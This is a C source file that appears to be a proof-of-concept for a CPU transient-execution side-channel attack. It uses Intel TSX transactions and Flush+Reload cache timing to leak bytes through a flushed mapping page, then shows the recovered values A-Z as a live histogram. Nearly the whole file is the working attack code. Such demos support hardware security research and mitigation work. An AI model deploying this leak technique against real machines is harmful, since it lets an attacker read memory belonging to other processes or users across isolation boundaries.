#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>

#include "cacheutils.h"

#define FROM 'A'
#define TO   'Z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];

void recover(void);

int main(int argc, char *argv[])
{
  if(!has_tsx()) {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }
    
  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }
  
  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);

  while (true) {
    /* Flush mapping */
    flush(mapping);

    /* Begin transaction and recover value */
    if(xbegin() == (~0u)) {
      maccess(mem + 4096 * mapping[0]);
      xend();
    }
    
    recover();
  }

  return 0;
}


void recover(void) {

    /* Recover value from cache and update histogram */
    bool update = false;
    for (size_t i = FROM; i <= TO; i++) {
      if (flush_reload((char*) mem + 4096 * i)) {
        hist[i]++;
        update = true;
      }
    }

    /* Redraw histogram on update */
    if (update == true) {
#ifdef _WIN32
        system("cls");
#else
        printf("\x1b[2J");
#endif

        int max = 1;

        for (int i = FROM; i <= TO; i++) {
          if (hist[i] > max) {
            max = hist[i];
          }
        }

        for (int i = FROM; i <= TO; i++) {
            printf("%c: (%4u) ", i, (unsigned int)hist[i]);
            for (int j = 0; j < hist[i] * 60 / max; j++) {
              printf("#");
            }
            printf("\n");
        }

        fflush(stdout);
    }    
}
